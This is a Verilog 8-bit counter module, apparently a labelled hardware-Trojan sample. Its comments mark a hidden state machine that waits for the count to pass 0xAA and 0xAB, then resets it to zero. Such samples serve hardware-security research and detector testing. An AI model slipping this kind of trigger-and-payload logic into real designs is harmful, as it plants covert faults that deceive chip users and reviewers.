module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  // Trojan FSM state
  reg [1:0] fsm_state;
  localparam S0 = 2'd0, S1 = 2'd1, S2 = 2'd2;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count     <= 8'd0;
      fsm_state <= S0;
    end else begin
      // Trojan FSM transitions
      case (fsm_state)
        S0: if (en && (count == 8'hAA)) fsm_state <= S1;
            else fsm_state <= S0;
        S1: if (en && (count == 8'hAB)) fsm_state <= S2;
            else fsm_state <= S0;
        S2: fsm_state <= S0;
        default: fsm_state <= S0;
      endcase

      // Counter logic with Trojan payload
      if (en) begin
        if (fsm_state == S2)
          count <= 8'h00;  // Trojan payload: reset count instead of incrementing
        else
          count <= count + 8'd1;
      end
    end
  end
endmodule